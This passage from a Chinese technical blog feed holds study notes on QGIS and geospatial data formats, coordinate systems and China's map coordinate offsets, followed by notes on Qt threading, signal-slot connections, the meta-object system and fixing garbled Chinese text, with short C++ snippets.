<p>QGIS 的目标是成为一个 GIS系统，提供常见的功能与特征。借着核心特征提供基本功能与附加组件（Python 或 C++） 持续地扩充，让使用者可以浏览、管理、编辑、分析数据以及制图。</p>
<p>QGIS安装请参考<a href="https://www.osgeo.cn/qgis-tutorial/overview-install.html" target="_blank" rel="noopener">QGIS安装</a>.</p>
<h1 id="QGIS界面"><a href="#QGIS界面" class="headerlink" title="QGIS界面"></a>QGIS界面</h1><p>安装QGIS时，将获得两个应用程序：QGIS Desktop 和 QGIS Browser。如果您熟悉ArcGIS， 则可以将QGIS Browser视为类似于ArcCatalog。这是一个用于预览空间数据和相关元数据的小型应用程序。</p>
<h1 id="栅格数据"><a href="#栅格数据" class="headerlink" title="栅格数据"></a>栅格数据</h1><p>栅格数据就是将空间分割成有规律的网格，每一个网格称为一个单元，并在各单元上赋予相应的属性值来表示实体的一种数据形式。 空间数据库是对地理栅格数据进行有效管理的一个极为重要的手段。</p>
<p>GIS系统的栅格数据格式有很多种，有卫星影像、数字高程模型、数字正射影像、扫描文件、数据栅格图形、 图形文件（”.jpg”，”.png”，”.tif”）等。其中常用的有”.jpg”，”.png”，”.tif”等。我们在一些任务中会利用一些电子地图下载器 来获取研究范围内的卫星地图，下载得到的格式就是”.jpg”或者”.png”。”.tif”格式的数据不同之处在于它具有空间地理坐标。</p>
<p>目前 QGIS 可以支持读取的主要栅格格式如下：</p>
<ul>
<li>Arc/Info Binary Grid</li>
<li>Arc/Info ASCII Grid</li>
<li>GRASS Raster</li>
<li>GeoTIFF</li>
<li>JPEG</li>
<li>Spatial Data Tranfer Standard Grids</li>
<li>USGS ASCII DEM</li>
<li>Erdas Imagine</li>
</ul>
<h1 id="矢量数据"><a href="#矢量数据" class="headerlink" title="矢量数据"></a>矢量数据</h1><p>矢量数据（Vector Data）是用X、Y、Z坐标表示地图图形或地理实体位置的数据。矢量数据一般通过记录坐标的方式来 尽可能将地理实体的空间位置表现的精确。常见的矢量数据有：点、线、面等格式。</p>
<p>QGIS可以支持多种的矢量数据，如常见的 Shapefile 和 MapInfo MIF、TAB； 另外 QGIS 亦支持在 PostgreSQL 数据库中的 PostGIS 图层；以及提供 CSV(delimited text)纯文本导入。</p>
<p>目前 QGIS 可以读取的矢量数据有：</p>
<ul>
<li>Arc/Info Binary Coverage</li>
<li>ESRI Shapefile</li>
<li>Mapinfo File</li>
<li>SDTS</li>
</ul>
<h2 id="SHP-Shapefile"><a href="#SHP-Shapefile" class="headerlink" title="SHP (Shapefile)"></a>SHP (Shapefile)</h2><p>Shapefile是目前最常见的一种矢量数据格式。作为行业标准，几乎所有的商业和开源GIS软件都支持Shapefile。</p>
<p>一个Shapefile数据最少包括文件：</p>
<p>主文件（ “*.shp” ）：存储地理要素的几何图形的文件。</p>
<p>索引文件（ “*.shx” ）：空间数据索引文件，存储地理数据几何特征的索引。</p>
<p>DBASE表文件（ “*.dbf” ）：它是存储属性数据的文件，用于存储地理数据的属性信息。有时候我们也称为表文件或者dbf文件。 这里值得注意一下的是，这个文件Excel也是能够打开的。</p>
<p>空间投影文件（ “*.prj” ）：用于存储空间参考，也就是投影方式文件。当然了，如果你的数据没有空间参考信息，这个文件自然也就没有了。</p>
<p>地理数据索引文件（ “<em>.sbn” , “</em>.sbx” ）：这两个文件只有在进行主题间空间关系查询、主题的空间联接和对shape字段进行索引的时候才存在。 它们用于存储地物特征的索引。</p>
<h1 id="地图-影像配准与数字化"><a href="#地图-影像配准与数字化" class="headerlink" title="地图/影像配准与数字化"></a>地图/影像配准与数字化</h1><h1 id="地图投影及坐标转换"><a href="#地图投影及坐标转换" class="headerlink" title="地图投影及坐标转换"></a>地图投影及坐标转换</h1><h2 id="地理坐标系"><a href="#地理坐标系" class="headerlink" title="地理坐标系"></a>地理坐标系</h2><p>如果使用纬度和经度，它可以在世界的任何地方表达， 与本地语言的地址符号不同，世界上每个人都可以理解。 基准系统（大地测量参考系统）是获得这种纬度和经度的标准， 大地测量系统和世界大地测量系统。</p>
<p>大地测量是为建立和维持测绘基准与测绘系统而进行的确定位置、 地球形状、重力场及其随时间和空间变化的测绘活动。世界大地测量系统（World geodetic system，简称WGS）是指1960年以来， 由美国国防制图局（DMA）建立的四个世界大地测量系统（WGS60、WGS66、WGS72和WGS84）的统称。</p>
<p>地理坐标系：为球面坐标。 参考平面地是椭球面，坐标单位：经纬度；</p>
<p>地理坐标转换到投影坐标的过程可理解为投影。（投影：将不规则的地球曲面转换为平面）；</p>
<p>地理坐标，就是用经线（子午线）、纬线、经度、纬度表示地面点位的球面坐标。</p>
<h3 id="地球的三级逼近"><a href="#地球的三级逼近" class="headerlink" title="地球的三级逼近"></a>地球的三级逼近</h3><p>大地水准面是地球表面的第一级逼近。假设当海水处于完全静止的平衡状态时，从海平面延伸到所有大陆下部， 而与地球重力方向处处正交的一个连续、闭合的曲面，这就是大地水准面。</p>
<p>大地水准面可以近似成一个规则成椭球体，但并不是完全规则， 其形状接近一个扁率极小的椭圆绕短轴旋转所形成的规则椭球体，这个椭球体称为地球椭球体。 它是地球的第二级逼近。</p>
<p>确定了一个规则的椭球表面以后，我们会发现还有一个问题， 参考椭球体是对地球的抽象，因此其并不能去地球表面完全重合， 在设置参考椭球体的时候必然会出现有的地方贴近的好（参考椭球体与地球表面位置接近）， 有的地方贴近的不好的问题，因此这里还需要一个大地基准面来控制参考椭球和地球的相对位置。 这是地球表面的第三级逼近。</p>
<p>地心基准面：由卫星数据得到，使用地球的质心作为原点，使用最广泛的是 WGS 1984。</p>
<p>区域基准面：特定区域内与地球表面吻合，大地原点是参考椭球与大地水准面相切的点，例如Beijing54、Xian80。 我们通常称谓的Beijing54、Xian80坐标系实际上指的是我国的两个大地基准面。</p>
<p>我们通常说的参心大地坐标系和地心大地坐标系的区别就在于此。</p>
<p>参心大地坐标系：指经过定位与定向后，地球椭球的中心不与地球质心 重合而是接近地球质心。区域性大地坐标系。是我国基本测图和常规大地测量的基础。如Beijing54、Xian80。</p>
<p>地心大地坐标系：指经过定位与定向后，地球椭球的中心与地球质心重合。如CGCS2000、WGS84。</p>
<h2 id="投影坐标系"><a href="#投影坐标系" class="headerlink" title="投影坐标系"></a>投影坐标系</h2><p>投影坐标系：为平面坐标。参考平面地是水平面，坐标单位：米、千米等；</p>
<p>在地球椭球面和平面之间建立点与点之间函数关系的数学方法，称为地图投影。</p>
<p>地球椭球表面是一种不可能展开的曲面，要把这样一个曲面表现到平面上，就会发生裂隙或褶皱。 在投影面上，可运用经纬线的“拉伸”或“压缩”（通过数学手段）来加以避免， 以便形成一幅完整的地图。但不可避免会产生变形。 地图投影的变形通常有：长度变形、面积变形和角度变形。 在实际应用中，根据使用地图的目的，限定某种变形。</p>
<h1 id="百度火星WGS84坐标转换"><a href="#百度火星WGS84坐标转换" class="headerlink" title="百度火星WGS84坐标转换"></a>百度火星WGS84坐标转换</h1><p>做国内，为了数据保密的原因，国家测绘地理信息局规定，凡是公开对外提供服务的在线地图都必须使用保密插件做一次非线性坐标转换，将原始WGS84坐标系的数据转换为GCJ02坐标系(俗称火星坐标系)，而百度在火星坐标系的基础上又做了一次偏移，形成了其自身的百度09坐标系，于是从互联网上下载、爬取的数据常用的坐标系有这么三大类：WGS84、GCJ02、BD09(从国外渠道下载的大多是WGS84，从高德、腾讯系下载的数据是火星坐标系GC02，从百度系下载的数据为百度坐标系BD09)</p>
<h1 id="常用矢量数据下载"><a href="#常用矢量数据下载" class="headerlink" title="常用矢量数据下载"></a>常用矢量数据下载</h1><p>请参考<a href="http://gaohr.win/site/blogs/2017/2017-04-18-GIS-basic-data-of-China.html" target="_blank" rel="noopener">中国国家基础地理信息数据</a>、<a href="http://gaohr.win/site/blogs/2019/2019-12-02-GIS-basic-data-of-world.html" target="_blank" rel="noopener">全球1:100万基础地理数据</a>。</p>
<h1 id="高程数据下载"><a href="#高程数据下载" class="headerlink" title="高程数据下载"></a>高程数据下载</h1><p>请参考<a href="https://blog.csdn.net/shi_weihappy/article/details/87888330" target="_blank" rel="noopener">GEE学习笔记 五十四：QGIS展示3D的高程数据</a>，<a href="https://blog.csdn.net/qq_41159191/article/details/126958851" target="_blank" rel="noopener">QGIS下载各种DEM的插件（SRTM 90m/30m -ALOS 30m -Cop 30m/90m-NASADEM Global DEM）</a>。</p>
<h1 id="高程数据合并"><a href="#高程数据合并" class="headerlink" title="高程数据合并"></a>高程数据合并</h1><p>请参考<a href="https://zhuanlan.zhihu.com/p/560130533" target="_blank" rel="noopener">QGIS（2）——dem处理（获取、拼接、裁剪等）</a>。</p>
<h1 id="加载WMS-WMTS图层"><a href="#加载WMS-WMTS图层" class="headerlink" title="加载WMS/WMTS图层"></a>加载WMS/WMTS图层</h1><ul>
<li>WMS:  Web Map Service</li>
<li>WMTS: Web Map Tile Service</li>
</ul>
<p>请参考<a href="https://blog.csdn.net/kuangxinyaya/article/details/123039103" target="_blank" rel="noopener">QGIS 2. 将网页中的地图或卫星图导入qgis (加载WMS/WMTS图层)</a>。</p>
<h1 id="GeoTiff-to-WMTS-WMS"><a href="#GeoTiff-to-WMTS-WMS" class="headerlink" title="GeoTiff to WMTS/WMS"></a>GeoTiff to WMTS/WMS</h1><p>使用 工具箱-&gt;栅格杂项-&gt;gdal2tiles 工具将GeoTiff文件切片。</p>
<p>XYZ编码含义请参考<a href="https://www.zhoulujun.cn/html/GIS/GIS-Science/8217.html" target="_blank" rel="noopener">OGC标准WMTS服务概念与地图商的瓦片编号流派-web地图切片加载</a>。</p>
<h1 id="瓦片信息查看工具"><a href="#瓦片信息查看工具" class="headerlink" title="瓦片信息查看工具"></a>瓦片信息查看工具</h1><p>瓦片信息请参考<a href="https://www.maptiler.com/google-maps-coordinates-tile-bounds-projection/" target="_blank" rel="noopener">maptiler tool</a>。</p>
<h1 id="具体应用"><a href="#具体应用" class="headerlink" title="具体应用"></a>具体应用</h1><h2 id="下载高清卫星图片"><a href="#下载高清卫星图片" class="headerlink" title="下载高清卫星图片"></a>下载高清卫星图片</h2><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/m0_37785454/article/details/135350795" target="_blank" rel="noopener">QGIS下载卫星影像全攻略</a></li>
<li><a href="https://blog.csdn.net/weixin_36396470/article/details/118602086" target="_blank" rel="noopener">如何使用QGIS下载Google地图的遥感影像</a></li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.osgeo.cn/qgis-tutorial/index.html" target="_blank" rel="noopener">QGIS 3 地理信息系统基础教程</a>,osgeo.</li>
<li><a href="https://www.jianshu.com/p/ff32eb09ed3d" target="_blank" rel="noopener">TIFF 文件格式</a>,by 雷震西山.</li>
<li><a href="https://www.modb.pro/db/239417" target="_blank" rel="noopener">qgis小技巧——加载GDB数据库</a>,by 大猫小鼠.</li>
<li><a href="https://www.cnblogs.com/lqqgis/p/14003644.html" target="_blank" rel="noopener">QGIS设置为中文界面</a>,by lqqgis.</li>
<li><a href="https://blog.csdn.net/qq_41159191/article/details/126837538" target="_blank" rel="noopener">QGIS添加在线底图</a>,by Vigo*GIS.</li>
<li><a href="https://zhuanlan.zhihu.com/p/65935155" target="_blank" rel="noopener">15篇QGIS教程打包送给你</a>,by 张云金.</li>
<li><a href="https://www.bilibili.com/read/cv12997740" target="_blank" rel="noopener">ArcGIS景观设计场景1：地理数据的获取</a>,by liu_jingyi.</li>
<li><a href="https://www.bilibili.com/read/cv13102791" target="_blank" rel="noopener">[场景2] 地理数据初步处理</a>,by liu_jingyi.</li>
<li><a href="https://blog.csdn.net/x572722344/article/details/108121230" target="_blank" rel="noopener">利用QGIS免费批量获取Google、Bing等高分辨率卫星影像</a>,by 蜂芒.</li>
<li><a href="https://blog.csdn.net/x572722344/article/details/108181586" target="_blank" rel="noopener">GeoTIFF、Shapefile和World File中空间参考的获取及其参数意义</a>,by 蜂芒.</li>
<li><a href="https://ruiduobao.blog.csdn.net/article/details/118602086" target="_blank" rel="noopener">如何使用QGIS下载Google地图的遥感影像</a>,by 锐多宝的地理空间.</li>
<li><a href="http://gaohr.win/site/blogs/2017/2017-04-18-GIS-basic-data-of-China.html" target="_blank" rel="noopener">中国国家基础地理信息数据</a>,by GaoHR.</li>
<li><a href="http://gaohr.win/site/blogs/2019/2019-12-02-GIS-basic-data-of-world.html" target="_blank" rel="noopener">全球1:100万基础地理数据</a>,by GaoHR.</li>
<li><a href="https://blog.csdn.net/shi_weihappy/article/details/87888330" target="_blank" rel="noopener">GEE学习笔记 五十四：QGIS展示3D的高程数据</a>,by 无形的风（知乎）.</li>
<li><a href="https://blog.csdn.net/kuangxinyaya/article/details/123039103" target="_blank" rel="noopener">QGIS 2. 将网页中的地图或卫星图导入qgis (加载WMS/WMTS图层)</a>,by GIS在找果酱山上的果酱熊.</li>
<li><a href="https://zhuanlan.zhihu.com/p/400797224" target="_blank" rel="noopener">QGIS 如何实现卫星图片（栅格数据）切片</a>,by 晓寒学生.</li>
<li><a href="https://www.zhoulujun.cn/html/GIS/WebGIS/433.html" target="_blank" rel="noopener">webGIS底图栅格化与实时数据合成处理原理,地图API设计,xyz加载</a>,by <a href="mailto:zhoulujun@live.cn">zhoulujun@live.cn</a>.</li>
<li><a href="https://www.zhoulujun.cn/html/GIS/GIS-Science/8217.html" target="_blank" rel="noopener">OGC标准WMTS服务概念与地图商的瓦片编号流派-web地图切片加载</a>,by zhoulujun.</li>
<li><a href="https://www.maptiler.com/google-maps-coordinates-tile-bounds-projection/" target="_blank" rel="noopener">maptiler tool</a>,by maptiler.</li>
<li>[<a href="https://blog.csdn.net/qq_41159191/article/details/126958851" target="_blank" rel="noopener">QGIS下载各种DEM的插件（SRTM 90m/30m -ALOS 30m -Cop 30m/90m-NASADEM Global DEM）</a>],by Vigo*GIS.</li>
<li><a href="https://juejin.cn/post/6844903661613629454" target="_blank" rel="noopener">壹张图看懂“火星坐标系”</a>,by 梭梭树壹号.</li>
<li><a href="https://zhuanlan.zhihu.com/p/560130533" target="_blank" rel="noopener">QGIS（2）——dem处理（获取、拼接、裁剪等）</a>,by 地学散人​.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>常用工具</tag>
        <tag>GIS</tag>
      </tags>
  </entry>
  <entry>
    <title>QT多线程及其与GUI组件的通信</title>
    <url>/2022/02/21/QT%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%8F%8A%E5%85%B6%E4%B8%8EGUI%E7%BB%84%E4%BB%B6%E7%9A%84%E9%80%9A%E4%BF%A1/</url>
    <content><![CDATA[<p>每个程序启动后拥有的第一个线程称为主线程，即<strong>GUI线程</strong>。QT中所有的组件类和几个相关的类只能工作在GUI线程，不能工作在次线程，次线程即<strong>工作线程</strong>，主要负责处理GUI线程卸下的工作。</p>
<p>每个线程都有自己的栈，因此每个线程都要自己的调用历史和本地变量。线程共享相同的地址空间。</p>
<h1 id="QT线程创建方法"><a href="#QT线程创建方法" class="headerlink" title="QT线程创建方法"></a>QT线程创建方法</h1><h2 id="QThread使用方法1——重写run-函数"><a href="#QThread使用方法1——重写run-函数" class="headerlink" title="QThread使用方法1——重写run()函数"></a>QThread使用方法1——重写run()函数</h2><p>对于使用Qthread创建的进程而言，run()函数则是新线程的入口，run()函数退出，意味着线程的终止。</p>
<h2 id="QThread使用方法2——moveToThread"><a href="#QThread使用方法2——moveToThread" class="headerlink" title="QThread使用方法2——moveToThread()"></a>QThread使用方法2——moveToThread()</h2><p>如果不想每执行一种任务就自定义一个新线程，那么可以自定义用于完成任务的类，并让它们继承自QObject。</p>
<p>然后使用moveToThread()将QObject对象实例移动到新线程。注意moveToThread()是QObject的公有函数。移动之后启动子线程。</p>
<h1 id="多线程与GUI组件的通信"><a href="#多线程与GUI组件的通信" class="headerlink" title="多线程与GUI组件的通信"></a>多线程与GUI组件的通信</h1><p>GUI系统的设计原则：所有界面组件的创建只能在GUI线程（主线程）中完成。子线程与界面组件的通信有两种方式：</p>
<ul>
<li>信号槽方式</li>
<li>发送自定事件方式</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://www.codebaoku.com/it-c/it-c-215894.html" target="_blank" rel="noopener">深入理解QT多线程编程</a>,by 编程宝库.</li>
<li><a href="https://wizardforcel.gitbooks.io/wudi-qt4/content/index.html" target="_blank" rel="noopener">零基础学 qt4 编程</a>,by wd007.</li>
<li><a href="https://its401.com/article/weixin_41211961/103604565" target="_blank" rel="noopener">多线程与界面组件的通信</a>,by 程序员ITS401.</li>
<li><a href="https://www.cnblogs.com/xyf327/p/15032670.html" target="_blank" rel="noopener">QT从入门到入土（五（1））——多线程（QThread）</a>,by 唯有自己强大.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>QT事件处理函数被触发两次的问题</title>
    <url>/2022/02/19/QT%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E5%87%BD%E6%95%B0%E8%A2%AB%E8%A7%A6%E5%8F%91%E4%B8%A4%E6%AC%A1%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>如果用官方的写法on_btn_pressed()可以不用写connect函数，可以直接触发槽函数。如果此时用connect再次连接的话，就会导致on_btn_pressed()被执行两次。</p>
<p>Qt信号-槽连接函数原型如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool QObject::connect ( const QObject * sender, const char * signal, const QObject * receiver, const char *method, Qt::ConnectionType type &#x3D; Qt::AutoConnection )</span><br></pre></td></tr></table></figure>

<p>Qt支持5种连接方式</p>
<ul>
<li>Qt::DirectConnection（直连方式）（信号与槽函数关系类似于函数调用，同步执行）</li>
</ul>
<p>当信号发出后，相应的槽函数将立即被调用。emit语句后的代码将在所有槽函数执行完毕后被执行。<br>当信号发射时，槽函数将直接被调用。<br>无论槽函数所属对象在哪个线程，槽函数都在发射信号的线程内执行。</p>
<ul>
<li>Qt::QueuedConnection（队列方式）（此时信号被塞到事件队列里，信号与槽函数关系类似于消息通信，异步执行）</li>
</ul>
<p>当信号发出后，排队到信号队列中，需等到接收对象所属线程的事件循环取得控制权时才取得该信号，调用相应的槽函数。emit语句后的代码将在发出信号后立即被执行，无需等待槽函数执行完毕。<br>当控制权回到接收者所依附线程的事件循环时，槽函数被调用。<br>槽函数在接收者所依附线程执行。</p>
<ul>
<li>Qt::AutoConnection（自动方式）</li>
</ul>
<p>Qt的默认连接方式，如果信号的发出和接收信号的对象同属一个线程，那个工作方式与直连方式相同；否则工作方式与队列方式相同。<br>如果信号在接收者所依附的线程内发射，则等同于直接连接<br>如果发射信号的线程和接受者所依附的线程不同，则等同于队列连接</p>
<ul>
<li>Qt::BlockingQueuedConnection(信号和槽必须在不同的线程中，否则就产生死锁)</li>
</ul>
<p>槽函数的调用情形和Queued Connection相同，不同的是当前的线程会阻塞住，直到槽函数返回。</p>
<ul>
<li>Qt::UniqueConnection</li>
</ul>
<p>与默认工作方式相同，只是不能重复连接相同的信号和槽，因为如果重复连接就会导致一个信号发出，对应槽函数就会执行多次。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/erchowyo/article/details/78428997" target="_blank" rel="noopener">QT按钮被触发两次的问题</a>,by 不二侬.</li>
<li><a href="https://blog.csdn.net/xiaopei_yan/article/details/81410092" target="_blank" rel="noopener">QVariant的用法</a>,by 十年之少.</li>
<li><a href="https://blog.csdn.net/qq598535550/article/details/60966378" target="_blank" rel="noopener">QT入门系列（4）：QString与int相互转换方法</a>,by 李奕锋.</li>
<li><a href="http://www.codebaoku.com/it-c/it-c-215894.html" target="_blank" rel="noopener">深入理解QT多线程编程</a>,by 编程宝库.</li>
<li><a href="https://www.cnblogs.com/xia-weiwen/p/10306089.html" target="_blank" rel="noopener">在Qt（C++）中使用QThread实现多线程</a>,by 星夜之夏.</li>
<li><a href="https://blog.csdn.net/shenziheng1/article/details/78055056" target="_blank" rel="noopener">Q_OBJECT宏的作用</a>,by 沈子恒.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>QT核心机制与原理</title>
    <url>/2021/02/06/QT%E6%A0%B8%E5%BF%83%E6%9C%BA%E5%88%B6%E4%B8%8E%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<p>要想学到QT的精髓，必须对QT的核心机制信号与槽、元对象系统、事件模型有充分的理解。</p>
<h1 id="信号与槽"><a href="#信号与槽" class="headerlink" title="信号与槽"></a>信号与槽</h1><p>信号和槽是一种高级接口，它们被应用于对象之间的通信，它们是Qt 的核心特性，也是Qt不同于其它同类工具包的重要地方之一。</p>
<h2 id="信号（signal）"><a href="#信号（signal）" class="headerlink" title="信号（signal）"></a>信号（signal）</h2><p>当对象的状态发生改变时，信号被某一个对象发射（ emit）。只有定义过这个信号的类或者其派生类能够发射这个信号。当一个信号被发射时，与其相关联的槽将被执行，就象一个正常的函数调用一样。信号-槽机制独立于任何GUI 事件循环。只有当所有的槽正确返回以后，发射函数（emit）才返回。</p>
<h2 id="槽（slot）"><a href="#槽（slot）" class="headerlink" title="槽（slot）"></a>槽（slot）</h2><p>槽是普通的C++成员函数，可以被正常调用，不同之处是它们可以与信号（ signal）相关联。当与其关联的信号被发射时，这个槽就会被调用。槽可以有参数，但槽的参数不能有缺省值。</p>
<h2 id="信号与槽的关联"><a href="#信号与槽的关联" class="headerlink" title="信号与槽的关联"></a>信号与槽的关联</h2><p>槽和普通的C++成员函数几乎是一样的－可以是虚函数；可以被重载；可以是共有的、 保护的或是私有的，并且也可以被其它C++成员函数直接调用；还有，它们的参数可以是任意类型。唯一不同的是：槽还可以和信号连接在一起，在这种情况下，每当发射这个信号的时候，就会自动调用这个槽。</p>
<p>connect()语句看起来会是如下的样子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">connect(sender,SIGNAL(signal),receiver,SLOT(slot));</span><br></pre></td></tr></table></figure>
<p>这里的sender 和receiver 是指向QObject 的指针，signal 和slot 是不带参数的函数名。实际上，SIGNAL()宏和SLOT()会把它们的参数转换成相应的字符串。</p>
<p>从QObject 或其子类(例如Qwidget)派生的类都能够使用信号和槽机制。这种机制本身是在QObject 中实现的，并不只局限于图形用户界面编程中：当对象的状态得到改变时， 它可以某种方式将信号发射(emit)出去，但它并不了解是谁在接收这个信号。</p>
<h1 id="元对象系统"><a href="#元对象系统" class="headerlink" title="元对象系统"></a>元对象系统</h1><p>Qt 的元对象系统是一个基于标准C＋＋的扩展，能够使C＋＋更好的适应真正的组件GUI 编程。它为Qt 提供了支持对象间通信的信号与槽机制、实时类型信息和动态属性系统等方面的功能。</p>
<p>元对象系统在Qt 中主要有以下三部分构成：QObject 类、Q_OBJECT 宏和元对象编译器moc。</p>
<h2 id="元对象系统机制"><a href="#元对象系统机制" class="headerlink" title="元对象系统机制"></a>元对象系统机制</h2><p>Qt 的主要成就之一是使用了一种机制对C++进行了扩展，并且使用这种机制创建了独立的软件组件。这些组件可以绑定在一起，但任何一个组件对于它所要连接的组件的情况事先都不了解。</p>
<p>这种机制称为元对象系统（meta-object system），它提供了关键的两项技术：信号－槽以及内省（introspection）。内省功能对于实现信号和槽是必需的，并且允许应用程序的开发人员在运行时获得有关QObject 子类的“元信息”（meta-information），包括一个含有对象的类名以及它所支持的信号和槽的列表。这一机制也支持属性（广泛用于Qt 设计师中）和文本翻译（用于国际化），并且它也为QtScirpt 模块奠定了基础。</p>
<p>标准C++没有对Qt 的元对象系统所需要的动态元信息提供支持。Qt 通过提供一个独立的moc 工具解决了这个问题，moc 解析Q_OBJECT 类的定义并且通过C++函数提供可供使用的信息。由于moc 使用纯C++来实现它的所有功能，所以Qt 的元对象系统可以在任意C++ 编译器上工作。</p>
<h2 id="元对象工具（moc）"><a href="#元对象工具（moc）" class="headerlink" title="元对象工具（moc）"></a>元对象工具（moc）</h2><p>Qt 的信号和槽机制是采用标准C++ 来实现的。该实现使用C++ 预处理器和Qt 所包括的moc（元对象编译器）。元对象编译器读取应用程序的头文件，并生成必要的代码，以支持信号和槽机制。</p>
<h1 id="事件模型"><a href="#事件模型" class="headerlink" title="事件模型"></a>事件模型</h1><p>应用程序对象将系统消息接收为Qt 事件。应用程序可以按照不同的粒度对事件加以监控、过滤并做出响应。</p>
<p>在Qt 中，事件是指从QEvent 继承的对象。Qt 将事件发送给每个QObject 对象，这样对象便可对事件做出响应。也就是说， Qt 的事件处理机制主要是基于QEvent 类来实现的，QEvent 类是其他事件类的基类。当一个事件产生时， Qt 就会构造一个QEvent 子类的实例来表述该事件，然后将该事件发送到相应的对象上进行处理。</p>
<p>Qt 的主事件循环能够从事件队列中获取本地窗口系统事件，然后判断事件类型，并将事件分发给特定的接收对象。主事件循环通过调用QCoreApplication::exec() 启动， 随着QCoreApplication::exit()结束，本地的事件循环可用利用QEventLoop 构建。作为事件分发器的QAbstractEventDispatcher 管理着Qt 的事件队列，事件分发器从窗口系统或其他事件源接收事件，然后将他们发送给QCoreApplication 或QApplication 的实例进行处理或继续分发。QAbstractEventDispatcher 为事件分发提供了良好的保护措施。</p>
<h1 id="事件与信号的区别"><a href="#事件与信号的区别" class="headerlink" title="事件与信号的区别"></a>事件与信号的区别</h1><p>(1) 使用场合和时机不同一般情况下，在“使用”窗口部件时，我们经常需要使用信号，并且会遵循信号与槽的机制；而在“实现”窗口部件时，我们就不得不考虑如何处理事件了。举个例子，当使用QPushButton 时，我们对于它的clicked()信号往往更为关注，而很少关心促成发射该信号的底层的鼠标或者键盘事件。但是，如果要实现一个类似于QPushButton 的类，我们就需要编写一定的处理鼠标和键盘事件的代码，而且在必要的时候，仍然需要发射和接收clicked()信号。</p>
<p>（2）使用的机制和原理不同</p>
<p>事件类似于Windows 里的消息，它的发出者一般是窗口系统。相对信号和槽机制，它比较“底层”，它同时支持异步和同步的通信机制，一个事件产生时将被放到事件队列里，然后我们就可以继续执行该事件“后面”的代码。事件的机制是非阻塞的。</p>
<p>信号和槽机制相对而言比较“高层”，它的发出者一般是对象。从本质上看，它类似于传统的回调机制，是不支持异步调用的。</p>
<p>(3) 信号与槽在多线程时支持异步调用</p>
<p>在单线程应用时，你可以把信号与槽看成是一种对象间的同步通信机制，这是因为在这种情况下，信号的释放过程是阻塞的，一定要等到槽函数返回后这个过程才结束，也就是不支持异步调用。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://wizardforcel.gitbooks.io/wudi-qt4/content/101.html" target="_blank" rel="noopener">第13 章Qt 核心机制与原理</a>,by wizardforcel.</li>
<li><a href="https://www.zhihu.com/question/27040542" target="_blank" rel="noopener">如何才能学到Qt的精髓？</a>,by zhihu.</li>
<li><a href="https://blog.csdn.net/lovekdy/article/details/101698482" target="_blank" rel="noopener">Qt中资源文件的使用及意义</a>,by Stephan_zry.</li>
<li><a href="https://zhuanlan.zhihu.com/p/615022779" target="_blank" rel="noopener">Qt：Qt资源系统</a>,by qt技术开发老杰.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>QT</tag>
      </tags>
  </entry>
  <entry>
    <title>QT5中文乱码解决方法</title>
    <url>/2022/02/21/QT5%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<h1 id="问题产生"><a href="#问题产生" class="headerlink" title="问题产生"></a>问题产生</h1><p>常用设置窗口标题方式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">window.setWindowTitle(&quot;中文&quot;) </span><br><span class="line"></span><br><span class="line">QString title &#x3D; &quot;中文&quot;</span><br><span class="line">window.setWindowTitle(title);</span><br></pre></td></tr></table></figure>

<p>使用上述方式设置窗口标题将产生乱码。</p>
<h1 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h1><p>字符编码不匹配导致乱码现象。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* 源码版本5.12 *&#x2F;</span><br><span class="line">void QWindowsWindow::setWindowTitle(const QString &amp;title)</span><br><span class="line">&#123;</span><br><span class="line">    setWindowTitle_sys(QWindowsWindow::formatWindowTitle(title));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;* 源码版本5.12 *&#x2F;</span><br><span class="line">void QWindowsBaseWindow::setWindowTitle_sys(const QString &amp;title)</span><br><span class="line">&#123;</span><br><span class="line">    qCDebug(lcQpaWindows) &lt;&lt; __FUNCTION__ &lt;&lt; this &lt;&lt; window() &lt;&lt; title;</span><br><span class="line">    SetWindowText(handle(), reinterpret_cast&lt;const wchar_t *&gt;(title.utf16()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从源码可以看出title.utf16()最终转换为utf16字符编码。</p>
<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">QString::fromUtf16(u&quot;中文&quot;);</span><br><span class="line"></span><br><span class="line">QString::fromLocal8Bit(&quot;中文&quot;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 推荐</span><br><span class="line">QString str &#x3D; QStringLiteral(&quot;中文文本&quot;);</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/qq_27278957/article/details/90635827" target="_blank" rel="noopener">QT 中文乱码解决汇总（包括QString与string、char*互转乱码）</a>,by 高祥xiang.</li>
